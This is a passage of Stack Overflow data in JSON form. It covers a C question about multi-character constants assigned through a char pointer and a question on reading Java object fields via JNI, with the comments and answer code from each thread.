"reply_to_user": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 1, "creation_date": 1476294215, "post_id": 40004998, "comment_id": 67287988, "body": "@WhozCraig: It is a valid multi-character integer constant. Problem is the layout of the resulting <code>int</code> is implementation-specific."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1476294284, "post_id": 40004998, "comment_id": 67288031, "body": "See <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a>, provide a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>. <code>getmem</code> is not a standard function."}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1476294349, "post_id": 40004998, "comment_id": 67288071, "body": "@Olaf indeed it is, but if you&#39;re not building for mbcs, the proper warning should be turned on. I know when building in Xcode (clang) non mbcs, that warning is up by default."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1476294498, "post_id": 40004998, "comment_id": 67288161, "body": "@WhozCraig: What is &quot;mbcs&quot;? And why should there be a warning about the integer constant? There might (and should) be a conversion warning (<code>-Wconversion</code>) for assigning an <code>int</code> to a <code>char</code>, but that&#39;s unrelated."}, {"owner": {"reputation": 50126, "user_id": 1717300, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81b91f602ce8acea8cbeb29f62725627?s=128&d=identicon&r=PG", "display_name": "hyde", "link": "https://stackoverflow.com/users/1717300/hyde"}, "reply_to_user": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1476294625, "post_id": 40004998, "comment_id": 67288241, "body": "@WhozCraig To be fair, turning up warning level on an old, inherited codebase can be... less than helpful, especially for less experienced C programmers."}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1476294842, "post_id": 40004998, "comment_id": 67288378, "body": "@Olaf the exact warning given by clang is: &quot;main.cpp:113:15: Multi-character character constant&quot;, it isn&#39;t flagged by -Wconversion (on my chain, anyway). There is a specific setting for that specific warning. Maybe an apple-contrived thing (they do that sometimes with their clang distros)."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 50126, "user_id": 1717300, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81b91f602ce8acea8cbeb29f62725627?s=128&d=identicon&r=PG", "display_name": "hyde", "link": "https://stackoverflow.com/users/1717300/hyde"}, "edited": false, "score": 0, "creation_date": 1476294863, "post_id": 40004998, "comment_id": 67288392, "body": "@hyde: It will mess things up first, but imo it is a good traning and a good way to enhance code quality in the mid-term. Translating bugged code with a modern compiler without fixing UB, etc. otoh can mess up things way worse."}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1476294886, "post_id": 40004998, "comment_id": 67288405, "body": "@Olaf true that, man. true that."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1476294943, "post_id": 40004998, "comment_id": 67288437, "body": "@WhozCraig: Can you provide the exact option? I&#39;ll check with gcc. I always try to have as much warnings enables are reasonable (which means allways all)."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1476295027, "post_id": 40004998, "comment_id": 67288481, "body": "@WhozCraig: Ok, found it: <code>-Wno-multichar</code> disables it, the default already is to warn. Heck, I like gcc (if I used clang, I might also like it:-)"}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1476295080, "post_id": 40004998, "comment_id": 67288515, "body": "@Olaf you beat me to the punch. The number of options passed to the build on Xcode (once you remember how to expand them) is pretty breathtaking. Thanks for finding it."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1476295385, "post_id": 40004998, "comment_id": 67288700, "body": "@WhozCraig: I&#39;m still not sure what &quot;mbcs&quot; means. &quot;Multi-Byte-Character-Sequence&quot;?"}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1476295534, "post_id": 40004998, "comment_id": 67288792, "body": "@Olaf multibyte character services. (some people use &quot;system&quot; for &#39;s&#39;). Older Xcode allowed you to turn it on or off, though I can&#39;t seem to find it in the latest release I&#39;m running now (7.2.1). Windows <i>still</i> has it as an option (though no one in their right mind uses it anymore)"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1476295783, "post_id": 40004998, "comment_id": 67288950, "body": "@WhozCraig: I don&#39;t use either. But I have a faint memory old MacOS used 4-character sequences to identify file-resources by using a 32 bit comparison. But those were the 68k and early PPC days :-)"}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1476295864, "post_id": 40004998, "comment_id": 67288980, "body": "@Olaf Funny you should mention that. That is <i>still</i> a configurable warning, <code>-Wno-four-char-constants</code> lolz."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1476296009, "post_id": 40004998, "comment_id": 67289061, "body": "@WhozCraig: Interestingly not for gcc. Maybe that&#39;s indeed something Apple-specific addition (too lazy now to check for vanilla clang)."}], "answers": [{"comments": [{"owner": {"reputation": 186, "user_id": 1022216, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/d55e87180af72d4042a541c4f9508e56?s=128&d=identicon&r=PG", "display_name": "Jerry Warra", "link": "https://stackoverflow.com/users/1022216/jerry-warra"}, "edited": false, "score": 0, "creation_date": 1476295153, "post_id": 40005110, "comment_id": 67288562, "body": "I&#39;m running this in Visual Studio 2012.  I tried strcpy and sramij suggestions and it still only shows 9.  If I add ptr += 1; after sramij suggestion works.  Is there no way to do 2 9&#39;s together?"}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "reply_to_user": {"reputation": 186, "user_id": 1022216, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/d55e87180af72d4042a541c4f9508e56?s=128&d=identicon&r=PG", "display_name": "Jerry Warra", "link": "https://stackoverflow.com/users/1022216/jerry-warra"}, "edited": false, "score": 2, "creation_date": 1476295223, "post_id": 40005110, "comment_id": 67288605, "body": "@JerryWarra by direct assignment, no. Not portably, anyway. You <i>could</i> <code>*ptr = *(ptr+1) = &#39;9&#39;;</code>, I suppose. And of course, don&#39;t forget to terminate."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "reply_to_user": {"reputation": 186, "user_id": 1022216, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/d55e87180af72d4042a541c4f9508e56?s=128&d=identicon&r=PG", "display_name": "Jerry Warra", "link": "https://stackoverflow.com/users/1022216/jerry-warra"}, "edited": false, "score": 0, "creation_date": 1476295675, "post_id": 40005110, "comment_id": 67288883, "body": "@JerryWarra, be aware that the <code>strcpy()</code> suggestion (i.e. <code>strcpy(ptr, &quot;99&quot;)</code>) is not exactly equivalent to the pair of single-character assignments, because it will also write a string terminator.  That may or may not be harmless."}], "tags": [], "owner": {"reputation": 4387, "user_id": 582782, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/d59b4e0d3fc4d5036ff05c66218f6c7a?s=128&d=identicon&r=PG", "display_name": "sramij", "link": "https://stackoverflow.com/users/582782/sramij"}, "is_accepted": true, "score": 2, "last_activity_date": 1476294374, "creation_date": 1476294374, "answer_id": 40005110, "question_id": 40004998, "link": "https://stackoverflow.com/questions/40004998/c-program-value-changing-from-1-to-2-characters/40005110#40005110", "title": "C program value changing from 1 to 2 characters", "body": "<p>You should not being doing multi-character in a single quotes. If you want double 99, at ptr, you should do:</p>\n\n<pre><code>*ptr = '9';\n*(ptr+1) = '9';\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 186, "user_id": 1022216, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/d55e87180af72d4042a541c4f9508e56?s=128&d=identicon&r=PG", "display_name": "Jerry Warra", "link": "https://stackoverflow.com/users/1022216/jerry-warra"}, "edited": false, "score": 0, "creation_date": 1476296192, "post_id": 40005400, "comment_id": 67289161, "body": "Thank you John for explaining it.  That makes more sense to me now.  Thanks to everyone for your help."}], "tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": false, "score": 2, "last_activity_date": 1476295355, "creation_date": 1476295355, "answer_id": 40005400, "question_id": 40004998, "link": "https://stackoverflow.com/questions/40004998/c-program-value-changing-from-1-to-2-characters/40005400#40005400", "title": "C program value changing from 1 to 2 characters", "body": "<p>The code</p>\n\n<blockquote>\n<pre><code>char *ptr ;\n</code></pre>\n</blockquote>\n\n<p>declares that the expression <code>*ptr</code> has type <code>char</code>, or, equivalently, that <code>ptr</code> is a pointer to a <code>char</code> (and therefore has type <code>char *</code>).  If you assign a value to the <code>char</code> designated by <code>*ptr</code> then you set <em>one</em> char, because that's what the left-hand side of the assignment represents.</p>\n\n<p>The integer character constant <code>'9'</code> corresponds to the character representing the decimal digit <code>9</code>.  The integer character constant <code>'99'</code> is also valid, but its meaning is implementation-defined.  Your particular implementation evidently defines it such that the result of converting it to type <code>char</code> is the same as the result of converting <code>'9'</code> to type <code>char</code>.  No matter how it was defined, however, assigning it to <code>*ptr</code> will modify only the one <code>char</code> to which <code>ptr</code> directly points, not any other.</p>\n\n<p>The simplest way to set the values of the <code>char</code> to which <code>ptr</code> points and the next one is that suggested by @EugeneSh., and also by another answer:</p>\n\n<pre><code>*ptr = '9'; *(ptr+1) = '9';\n</code></pre>\n\n<p>There are other conforming alternatives, but you have not presented anything giving me reason to think that one of the alternatives would preferable.</p>\n"}], "owner": {"reputation": 186, "user_id": 1022216, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/d55e87180af72d4042a541c4f9508e56?s=128&d=identicon&r=PG", "display_name": "Jerry Warra", "link": "https://stackoverflow.com/users/1022216/jerry-warra"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 59, "favorite_count": 0, "accepted_answer_id": 40005110, "answer_count": 2, "score": -1, "last_activity_date": 1476295355, "creation_date": 1476293996, "question_id": 40004998, "link": "https://stackoverflow.com/questions/40004998/c-program-value-changing-from-1-to-2-characters", "title": "C program value changing from 1 to 2 characters", "body": "<p>I have inherited a C program and I have very limited C experience.<br>\nThis is the code that is currently there:</p>\n\n<pre><code>char *ptr ;\nif (data == 0)  /* Buffer not acquired */\n  data = (char *)getmem(65535);\nptr = data;  /* create data record */\n*ptr = '9';             \n</code></pre>\n\n<p>Later in this process it dumps this information to a text file.</p>\n\n<p>I need the data to show double 9's.</p>\n\n<pre><code>char *ptr ;\nif (data == 0)  /* Buffer not acquired */\n  data = (char *)getmem(65535);\nptr = data;  /* create data record */\n*ptr = '99';                \n</code></pre>\n\n<p>When this outputs the info it still only shows one 9.  Am I not doing the memory allocation correctly? </p>\n"}, {"tags": ["c", "object", "java-native-interface"], "answers": [{"comments": [{"owner": {"reputation": 532, "user_id": 3506300, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/74303643814c70273d978f9a8b3ef309?s=128&d=identicon&r=PG&f=1", "display_name": "kumarD", "link": "https://stackoverflow.com/users/3506300/kumard"}, "edited": false, "score": 0, "creation_date": 1487256881, "post_id": 40006033, "comment_id": 71710852, "body": "GetFieldId() expects the field name and the data type of the field, what if we don&#39;t know what these two things are ? is there a way to get them ?"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "reply_to_user": {"reputation": 532, "user_id": 3506300, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/74303643814c70273d978f9a8b3ef309?s=128&d=identicon&r=PG&f=1", "display_name": "kumarD", "link": "https://stackoverflow.com/users/3506300/kumard"}, "edited": false, "score": 0, "creation_date": 1487263955, "post_id": 40006033, "comment_id": 71716664, "body": "@kumarD, you can use Java&#39;s reflection API (<code>java.lang.Class</code>, <code>java.lang.reflect.Field</code>, etc.), more easily from the Java side but from the native side if necessary, to glean information about the fields of a class.  JNI has <a href=\"http://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#reflection_support\" rel=\"nofollow noreferrer\">functions that can bridge between reflection API objects and JNI</a>.  But if you find yourself wanting to do this then you should probably have a good long think.  If that doesn&#39;t disabuse you of the notion, then perhaps a bonk on the head will help."}, {"owner": {"reputation": 532, "user_id": 3506300, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/74303643814c70273d978f9a8b3ef309?s=128&d=identicon&r=PG&f=1", "display_name": "kumarD", "link": "https://stackoverflow.com/users/3506300/kumard"}, "edited": false, "score": 0, "creation_date": 1487307822, "post_id": 40006033, "comment_id": 71735696, "body": "Actually i want to capture the state of the application like method variable values, class variable values etc when an exception occurs, this is the only way in which that can be achieved right ?"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "reply_to_user": {"reputation": 532, "user_id": 3506300, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/74303643814c70273d978f9a8b3ef309?s=128&d=identicon&r=PG&f=1", "display_name": "kumarD", "link": "https://stackoverflow.com/users/3506300/kumard"}, "edited": false, "score": 0, "creation_date": 1487343434, "post_id": 40006033, "comment_id": 71756479, "body": "@kumarD, you need much more than this if you want to examine the values of local variables of methods on the call stack, or the values of fields of the objects / classes on which those methods were invoked.  Such activities go far beyond what the OP asked about, and are not (directly) supported by JNI.  Perhaps you want to look into <a href=\"https://docs.oracle.com/javase/8/docs/technotes/guides/jvmti/\" rel=\"nofollow noreferrer\">JVMTI</a>."}], "tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": false, "score": 2, "last_activity_date": 1476297533, "creation_date": 1476297533, "answer_id": 40006033, "question_id": 40004522, "link": "https://stackoverflow.com/questions/40004522/how-to-get-values-from-jobject-in-c-using-jni/40006033#40006033", "title": "How to get values from jobject in C using JNI?", "body": "<p>Whether you're writing native methods or embedding a JVM in your C program, you really ought to read <a href=\"http://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/jniTOC.html\" rel=\"nofollow\">the JNI documentation</a>.  It contains quite a bit of information you will need to know, including details of <a href=\"http://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#accessing_fields_of_objects\" rel=\"nofollow\">the JNI functions for accessing the fields of a Java object</a>.</p>\n\n<p>In brief, to get the value of a field, you</p>\n\n<ol>\n<li><p>Obtain its field ID via <code>GetFieldID()</code>.  This will require that you also get (or already have) a <code>jclass</code> object representing the class to which the field belongs; you might obtain that via <code>GetObjectClass()</code> or <code>FindClass()</code>.</p></li>\n<li><p>Obtain the field's value with the one of the <code>GetXXXField()</code> methods for which <code>XXX</code> is appropriate to the field's declared type.  For Java <code>String</code>s, that would be <code>GetObjectField()</code>; for Java <code>int</code>s it would be <code>GetIntField()</code>.</p></li>\n</ol>\n\n<p>If you want to look at the details of the strings, you will need to also use some of the <a href=\"http://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#string_operations\" rel=\"nofollow\">String manipulation functions</a>, such as <code>GetStringUTFChars()</code> and <code>GetStringUTFLength()</code>.  And do not overlook the important distinction between those functions, which operate in terms of modified UTF-8, and the analogous functions that operate in terms of \"Unicode characters\" (which really means UTF-16).</p>\n"}, {"tags": [], "owner": {"reputation": 139, "user_id": 1759789, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/efe584fd987e36da7ba1f8c20516cbe7?s=128&d=identicon&r=PG", "display_name": "user1759789", "link": "https://stackoverflow.com/users/1759789/user1759789"}, "is_accepted": false, "score": 1, "last_activity_date": 1476457184, "last_edit_date": 1495542837, "creation_date": 1476372137, "answer_id": 40025025, "question_id": 40004522, "link": "https://stackoverflow.com/questions/40004522/how-to-get-values-from-jobject-in-c-using-jni/40025025#40025025", "title": "How to get values from jobject in C using JNI?", "body": "<p>I agree with John Bollinger.\nHere is an example based on another [question]:<a href=\"https://stackoverflow.com/questions/20501253/jni-how-to-get-jstring-from-jobject-and-convert-it-to-char\">JNI. How to get jstring from jobject and convert it to char*</a> </p>\n\n<p>In your case if the class in java is Person and the fields are firstName, lastName, and age then you might try the following code:</p>\n\n<pre><code>    // How can I get values of jobject o?\n    jclass personClass = (*env)-&gt;GetObjectClass(env, o);\n    jfieldID firstNameId = (*env)-&gt;GetFieldID(env,personClass,\"firstName\",\"S\");\n    jstring firstNameString = (jstring)(*env)-&gt;GetObjectField(env, o, firstNameId);\n    jfieldID lastNameId = (*env)-&gt;GetFieldID(env,personClass,\"lastName\",\"S\");\n    jstring lastNameString = (jstring)(*env)-&gt;GetObjectField(env, o, lastNameId);\n    jfieldID ageId = (*env)-&gt;GetFieldID(env,personClass,\"age\",\"I\");\n    jint age = (*env)-&gt;GetIntField(env,o,ageId);\n</code></pre>\n\n<p>Now you can use that data to fill your struct.</p>\n"}, {"comments": [{"owner": {"reputation": 9545, "user_id": 5295429, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XcJZr.png?s=128&g=1", "display_name": "Oo.oO", "link": "https://stackoverflow.com/users/5295429/oo-oo"}, "reply_to_user": {"reputation": 836, "user_id": 740445, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7885e36acb2934f1def00caa7e766b99?s=128&d=identicon&r=PG", "display_name": "connor.p", "link": "https://stackoverflow.com/users/740445/connor-p"}, "edited": false, "score": 2, "creation_date": 1507752162, "post_id": 40140241, "comment_id": 80340986, "body": ".oOo. np ;) Have fun with JNI! .oOo."}, {"owner": {"reputation": 1698, "user_id": 1999190, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/dTZPR.jpg?s=128&g=1", "display_name": "Shachi", "link": "https://stackoverflow.com/users/1999190/shachi"}, "edited": false, "score": 1, "creation_date": 1539767905, "post_id": 40140241, "comment_id": 92618173, "body": "Got idea to get an arrayobject from one class to another from your answer. Thanku soo much.."}, {"owner": {"reputation": 367, "user_id": 8092363, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CXJ0u.jpg?s=128&g=1", "display_name": "peco", "link": "https://stackoverflow.com/users/8092363/peco"}, "edited": false, "score": 0, "creation_date": 1603200246, "post_id": 40140241, "comment_id": 113956558, "body": "thank you so much for this answer. I have small question when we want to call c++ function from Java.  For example this method is in C++: <code>int myFunction(JNIEnv *env, jclass obj, jint a, MyCppClass* object)</code>  If I use Register Narratives method inside <code>JNI_Onload</code> i should have <code>static JNINativeMethod methods[] = {{&quot;myFunction&quot;,  &quot;(I?)I&quot;, (void *)&amp;addOne}}</code>.  What should be in the place of <code>?</code> for the MyCppClass* argument? Thank you so much in advance"}, {"owner": {"reputation": 9545, "user_id": 5295429, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XcJZr.png?s=128&g=1", "display_name": "Oo.oO", "link": "https://stackoverflow.com/users/5295429/oo-oo"}, "edited": false, "score": 1, "creation_date": 1603205508, "post_id": 40140241, "comment_id": 113959575, "body": "You can\u2019t mix C++ classes with JNI types. You can pass pointers between C++ and Java, but you can\u2019t pass C++ class. In case of C++ code I suggest using adapter pattern: <a href=\"https://github.com/mkowsiak/jnicookbook/tree/master/recipes/recipeNo025\" rel=\"nofollow noreferrer\">github.com/mkowsiak/jnicookbook/tree/master/recipes/recipeNo&zwnj;&#8203;025</a>"}], "tags": [], "owner": {"reputation": 9545, "user_id": 5295429, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XcJZr.png?s=128&g=1", "display_name": "Oo.oO", "link": "https://stackoverflow.com/users/5295429/oo-oo"}, "is_accepted": false, "score": 14, "last_activity_date": 1476906267, "creation_date": 1476906267, "answer_id": 40140241, "question_id": 40004522, "link": "https://stackoverflow.com/questions/40004522/how-to-get-values-from-jobject-in-c-using-jni/40140241#40140241", "title": "How to get values from jobject in C using JNI?", "body": "<pre><code>/* PassObject.java */\npackage recipeNo020;\n\npublic class PassObject {\n\n    /* This is the native method we want to call */\n    public static native void displayObject(Object obj);\n\n    /* Inside static block we will load shared library */\n    static {\n            System.loadLibrary(\"PassObject\");\n    }\n\n    public static void main(String[] args) {\n    /* This message will help you determine whether\n        LD_LIBRARY_PATH is correctly set\n    */\n    System.out.println(\"library: \"\n        + System.getProperty(\"java.library.path\"));\n\n    /* Create object to pass */\n    CustomClass cc = new CustomClass();\n    cc.iVal = 1;\n    cc.dVal = 1.1;\n    cc.cVal = 'a';\n    cc.bVal = true;\n    cc.sVal = \"Hello from the CustomClass\";\n    cc.oVal = new OtherClass();\n    cc.oVal.sVal = \"Hello from the OtherClass\";\n\n    /* Call to shared library */\n        PassObject.displayObject(cc);\n  }\n}\n\n/* CustomClass.java */\npackage recipeNo020;\n\npublic class CustomClass {\n    public int iVal;\n    public double dVal;\n    public char cVal;\n    public boolean bVal;\n    public OtherClass oVal;\n    public String sVal;\n}\n\n/* OtherClass.java */\npackage recipeNo020;\n\npublic class OtherClass {\n    public String sVal;\n}\n\n/* recipeNo020_PassObject.c */\n\n#include &lt;stdio.h&gt;\n#include \"jni.h\"\n#include \"recipeNo020_PassObject.h\"\n\nJNIEXPORT void JNICALL Java_recipeNo020_PassObject_displayObject\n  (JNIEnv *env, jclass obj, jobject objarg) {\n\n    /* Get objarg's class - objarg is the one we pass from\n       Java */\n    jclass cls = (*env)-&gt;GetObjectClass(env, objarg);\n\n    /* For accessing primitive types from class use\n           following field descriptors\n\n           +---+---------+\n           | Z | boolean |\n           | B | byte    |\n           | C | char    |\n           | S | short   |\n           | I | int     |\n           | J | long    |\n           | F | float   |\n           | D | double  |\n           +-------------+\n    */\n\n    /* Get int field\n\n       Take a look here, we are passing char* with\n           field descriptor - e.g. \"I\" =&gt; int\n        */\n    jfieldID fidInt = (*env)-&gt;GetFieldID(env, cls, \"iVal\", \"I\");\n    jint iVal = (*env)-&gt;GetIntField(env, objarg, fidInt);\n    printf(\"iVal: %d\\n\", iVal);\n\n    /* Get double field */\n    jfieldID fidDouble = (*env)-&gt;GetFieldID(env, cls, \"dVal\", \"D\");\n    jdouble dVal = (*env)-&gt;GetIntField(env, objarg, fidDouble);\n    printf(\"dVal: %f\\n\", dVal);\n\n    /* Get boolean field */\n    jfieldID fidBoolean = (*env)-&gt;GetFieldID(env, cls, \"bVal\", \"Z\");\n    jboolean bVal = (*env)-&gt;GetIntField(env, objarg, fidBoolean);\n    printf(\"bVal: %d\\n\", bVal);\n\n    /* Get character field */\n    jfieldID fidChar = (*env)-&gt;GetFieldID(env, cls, \"cVal\", \"C\");\n    jboolean cVal = (*env)-&gt;GetIntField(env, objarg, fidChar);\n    printf(\"cVal: %c\\n\", cVal);\n\n    /* Get String field */\n    jfieldID fidString = 